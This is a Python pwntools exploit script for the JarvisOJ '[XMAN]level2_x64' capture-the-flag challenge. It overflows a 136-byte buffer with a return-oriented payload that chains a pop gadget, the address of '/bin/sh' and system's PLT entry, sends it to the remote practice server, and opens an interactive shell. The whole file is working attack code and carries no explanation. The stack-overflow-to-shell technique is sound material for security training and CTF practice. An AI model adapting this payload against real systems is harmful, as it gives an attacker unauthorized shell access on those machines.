from pwn import *


def x_man_level2_x64(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/[XMAN]level2_x64'):
    print('[XMAN]level2_x64 start')
    # io = process([file_name])
    io = remote('pwn2.jarvisoj.com', 9882)

    elf = ELF(file_name)

    bin_sh_addr = p64(next(elf.search(b'/bin/sh')))
    system_plt = p64(0x000000000040063E)
    pop_ret_gadget = p64(0x00000000004006b3)

    payload = b'A' * 136

    payload += pop_ret_gadget + bin_sh_addr + system_plt

    io.sendline(payload)

    io.interactive()



    print('[XMAN]level2_x64 end')


if __name__ == '__main__':
    x_man_level2_x64()
